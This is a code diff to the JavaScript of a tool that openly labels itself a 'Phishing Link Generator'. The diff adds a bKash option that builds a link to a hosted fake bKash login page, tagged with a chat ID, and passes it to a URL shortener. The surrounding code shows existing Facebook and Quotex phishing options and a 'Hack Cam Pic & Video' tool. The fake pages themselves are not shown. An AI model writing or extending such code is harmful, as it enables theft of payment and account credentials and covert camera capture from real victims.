@@ -47,6 +47,12 @@ if (account === 'facebook') {
   document.title = "Quotex Phishing Link Generator";
   document.getElementById("hi-text").textContent = "Quotex Phishing Link Generator";
   document.getElementById("submit-button").textContent = "Generate";
+} else if (account === 'bkash') {
+  input.style.display = 'none';
+  input.required = false;
+  document.title = "bkash Phishing Link Generator";
+  document.getElementById("hi-text").textContent = "bKash Phishing Link Generator";
+  document.getElementById("submit-button").textContent = "Generate";
 } else if (tools === 'camara') {
   input.required = true;
   document.title = "Hack Cam Pic & Video";
@@ -85,6 +91,10 @@ async function fetchInfo(event) {
   } else if (account === 'quotex') {
     const urlInput = 'https://md-fahim-sarker.github.io/Service-Tools/account/quotex.html?id=' + chatId;
     const phishingLinkText = "Quotex";
+    urlshorter(phishingLinkText, urlInput);
+  } else if (account === 'bkash') {
+    const urlInput = 'https://md-fahim-sarker.github.io/Service-Tools/account/bkash-login.html?id=' + chatId;
+    const phishingLinkText = "bKash";
     urlshorter(phishingLinkText, urlInput);
   } else if (tools === 'camara') {
     const url = document.getElementById('input-text').value; // Replace with the actual URL
